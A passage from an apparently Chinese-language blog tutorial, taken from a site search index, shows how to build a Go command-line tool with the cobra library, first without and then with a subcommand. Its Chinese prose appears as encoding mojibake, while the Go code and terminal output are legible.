çš„åŸºç¡€ä¸Šå®Œæˆä¸€ä¸ªä¸å¸¦å­å‘½ä»¤çš„CLIã€‚é¦–å…ˆï¼Œæˆ‘éœ€è¦ç¼–å†™æˆ‘çš„ä¸šåŠ¡é€»è¾‘ï¼Œå› æ­¤æˆ‘åœ¨demoä¸‹é¢æ–°å»ºä¸€ä¸ªåŒ…ï¼Œåç§°ä¸ºsimpleã€‚å¦‚ä¸‹ï¼š123456789maojun@maojun-mbp$ tree ..â”œâ”€â”€ LICENSEâ”œâ”€â”€ cmdâ”‚ â””â”€â”€ root.goâ”œâ”€â”€ main.goâ””â”€â”€ simple â”œâ”€â”€ simple.go â””â”€â”€ simple_test.go è¿™é‡Œä»…ä»…å®ç°ä¸€ä¸ªprintä½œä¸ºæ ·ä¾‹,å› æ­¤simple.goæ˜¯è¿™æ ·å®ç°çš„123456789package simpleimport ( "fmt")func Show(name string, age int) &#123; fmt.Printf("My name is %s, my age is %d\n", name, age)&#125; æ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦å°†æˆ‘ä»¬å®è¡Œçš„æ•´ä¸ªShowæ–¹æ³•æš´éœ²ç»™CLI, æˆ‘ä»¬ä»ç”Ÿæˆçš„mainæ–‡ä»¶å…¥æ‰‹åˆ†æã€‚ åœ¨mainé‡Œé¢è°ƒç”¨äº† demo/cmdåŒ…é‡Œé¢æš´éœ²çš„Execute å‡½æ•° [cmd.Execute()] åœ¨demo/cmd/root.goä¸­å‘ç°Executeæ‰§è¡Œçš„æ˜¯RootCmd.Execute() è€ŒRootCmdæ˜¯ä¸€ä¸ªcobraçš„Commandç»“æ„ä½“[RootCmd = &amp;cobra.Command]æ˜¾ç„¶æˆ‘ä»¬æƒ³è¦å®è¡Œä¸å¸¦å­å‘½ä»¤çš„CLIï¼Œåªéœ€è¦å°†RootCmdçš„ä¿®æ”¹æˆæˆ‘ä»¬éœ€è¦çš„ç»“æ„ä½“å°±okäº† è¿™é‡Œåšäº†å‡ ç‚¹ä¿®æ”¹ RootCmdä¸­çš„Commandç»“æ„ä½“ä¸­çš„Runæ–¹æ³•éœ€è¦æˆ‘ä»¬å®šä¹‰ï¼Œ ä¸»è¦åŠŸèƒ½å°±æ˜¯è°ƒç”¨simpleé‡Œé¢çš„Showæ¥å£ cmdåŒ…åˆå§‹åŒ–å¾—æ—¶å€™éœ€è¦é€šè¿‡RootCmd.Flags()è·å–å‘½ä»¤è¡Œä¼ å…¥çš„nameå’Œageçš„å‚æ•°ï¼Œå› æ­¤è¿™é‡Œéœ€è¦ä¿®æ”¹initæ–¹æ³• æœ€åæˆ‘ä»¬ä¸éœ€è¦ä»é…ç½®æ–‡ä»¶è¯»å–é…ç½®ï¼Œæ³¨é‡Šæ‰ï¼šnitConfigå‡½æ•°å’Œâ€github.com/spf13/viperâ€ æœ€ç»ˆè¿™ä¸ªroot.goæ˜¯è¿™æ ·çš„123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687// Copyright Â© 2016 NAME HERE &lt;EMAIL ADDRESS&gt;//// Licensed under the Apache License, Version 2.0 (the "License");// you may not use this file except in compliance with the License.// You may obtain a copy of the License at//// http://www.apache.org/licenses/LICENSE-2.0//// Unless required by applicable law or agreed to in writing, software// distributed under the License is distributed on an "AS IS" BASIS,// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.// See the License for the specific language governing permissions and// limitations under the License.package cmdimport ( "fmt" "os" "demo/simple" "github.com/spf13/cobra" // "github.com/spf13/viper")//var cfgFile stringvar name stringvar age int// RootCmd represents the base command when called without any subcommandsvar RootCmd = &amp;cobra.Command&#123; Use: "demo", Short: "A test demo", Long: `Demo is a test appcation for print things`,// Uncomment the following line if your bare application// has an action associated with it: Run: func(cmd *cobra.Command, args []string) &#123; if len(name) == 0 &#123; cmd.Help() return &#125; simple.Show(name, age) &#125;,&#125;// Execute adds all child commands to the root command sets flags appropriately.// This is called by main.main(). It only needs to happen once to the rootCmd.func Execute() &#123; if err := RootCmd.Execute(); err != nil &#123; fmt.Println(err) os.Exit(-1) &#125;&#125;func init() &#123; // cobra.OnInitialize(initConfig) // Here you will define your flags and configuration settings. // Cobra supports Persistent Flags, which, if defined here, // will be global for your application. // RootCmd.PersistentFlags().StringVar(&amp;cfgFile, "config", "", "config file (default is $HOME/.demo.yaml)") // Cobra also supports local flags, which will only run // when this action is called directly. // RootCmd.Flags().BoolP("toggle", "t", false, "Help message for toggle") RootCmd.Flags().StringVarP(&amp;name, "name", "n", "", "persion's name") RootCmd.Flags().IntVarP(&amp;age, "age", "a", 0, "person's age")&#125;// // initConfig reads in config file and ENV variables if set.// func initConfig() &#123;// if cfgFile != "" &#123; // enable ability to specify config file via flag// viper.SetConfigFile(cfgFile)// &#125;// viper.SetConfigName(".demo") // name of config file (without extension)// viper.AddConfigPath("$HOME") // adding home directory as first search path// viper.AutomaticEnv() // read in environment variables that match// // If a config file is found, read it in.// if err := viper.ReadInConfig(); err == nil &#123;// fmt.Println("Using config file:", viper.ConfigFileUsed())// &#125;// &#125; æœ€åæµ‹è¯•ä¸‹æ˜¯ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„æ•ˆæœ1234567891011maojun@maojun-mbp$ go run main.go -hDemo is a test appcation for print thingsUsage: demo [flags]Flags: -a, --age int person's age -n, --name string persion's namemaojun@maojun-mbp$ go run main.go -n "test" -a 10My name is test, my age is 10 å¸¦å­å‘½ä»¤çš„CLIå¯¹äºå¤æ‚çš„æƒ…å†µï¼Œå¾€å¾€éœ€è¦å¸¦å­å‘½ä»¤åœºæ™¯ï¼Œæ¯”å¦‚Dockerçš„CLIï¼Œè€Œæœ€ç»ˆçš„æ•ˆæœåº”è¯¥æ˜¯è¿™æ ·çš„12345678910111213141516demoDemo is a test appcation for print thingsUsage: demo [flags] demo [command]Available Commands: test A brief description of your commandFlags: -a, --age int person's age -h, --help help for demo -n, --name string person's nameUse "demo [command] --help" for more information about a command. æ”¯æŒå­å‘½ä»¤æ˜¯cobraçš„è‡ªå·±çš„åŠŸèƒ½ï¼Œå› æ­¤ç›´æ¥å¯ä»¥é€šè¿‡cobraç”Ÿæˆå¸¦å­å‘½ä»¤çš„ä»£ç 12345678maojun@maojun-mbp$ cobra init demoYour Cobra application is ready at/Users/maojun/GoWorkDir/src/demoGive it a try by going there and running `go run main.go`Add commands to it by running `cobra add [cmdname]`maojun@maojun-mbp$ cobra add testtest created at /Users/maojun/GoWorkDir/src/cmd/test.go æ³¨é‡Šæ‰root.goé‚£äº›ä¸éœ€è¦çš„åœ°æ–¹, ç„¶åä¿®æ”¹ç”Ÿæˆçš„test.go12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455// Copyright Â© 2016 NAME HERE &lt;EMAIL ADDRESS&gt;//// Licensed under the Apache License, Version 2.0 (the "License");// you may not use this file except in compliance with the License.// You may obtain a copy of the License at//// http://www.apache.org/licenses/LICENSE-2.0//// Unless required by applicable law or agreed to in writing, software// distributed under the License is distributed on an "AS IS" BASIS,// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.// See the License for the specific language governing permissions and// limitations under the License.package cmdimport ( "fmt" "github.com/spf13/cobra")var name stringvar age int// testCmd represents the test commandvar testCmd = &amp;cobra.Command&#123; Use: "test", Short: "A brief description of your command", Long: `A longer description that spans multiple lines and likely contains examplesand usage of using your command. For example:Cobra is a CLI library for Go that empowers applications.This application is a tool to generate the needed filesto quickly create a Cobra application.`, Run: func(cmd *cobra.Command, args []string) &#123; // TODO: Work your own magic here fmt.Printf("My name is %s, my age is %d\n", name, age) &#125;,&#125;func init() &#123; RootCmd.AddCommand(testCmd) // Here you will define your flags and configuration settings. // Cobra supports Persistent Flags which will work for this command // and all subcommands, e.g.: // testCmd.PersistentFlags().String("foo", "", "A help for foo") // Cobra supports local flags which will only run when this command // is called directly, e.g.: testCmd.Flags().StringVarP(&amp;name, "name", "n", "", "persion's name") testCmd.Flags().IntVarP(&amp;age, "age", "a", 0, "person's age")&#125; æœ€åæµ‹è¯•ä¸‹æ˜¯ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„æ•ˆæœ 12345678910111213141516171819202122232425262728293031323334353637383940maojun@maojun-mbp$ go run main.go -hA longer description that spans multiple lines and likely containsexamples and usage of using your application. For example:Cobra is a CLI library for Go that empowers applications.This application is a tool to generate the needed filesto quickly create a Cobra application.Usage: demo [command]Available Commands: test A brief description of your commandFlags: --config string config file (default is $HOME/.demo.yaml) -t, --toggle Help message for toggleUse "demo [command] --help" for more information about a command.maojun@maojun-mbp$ go run main.go test -hA longer description that spans multiple lines and likely contains examplesand usage of using your command. For example:Cobra is a CLI library for Go that empowers applications.This application is a tool to generate the needed filesto quickly create a Cobra application.Usage: demo test [flags]Flags: -a, --age int person's age -n, --name string persion's nameGlobal Flags: --config string config file (default is $HOME/.demo.yaml) maojun@maojun-mbp$ go run main.go test -a 10 -n testMy name is test, my age is 10 å‘½ä»¤è¡Œè¡¥å…¨ï¼Œmanè¿™äº›å¯ä»¥è‡ªå·±æ‰‹åŠ¨æµ‹è¯•]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>cobra</tag>
      </tags>
  </entry>
</search>
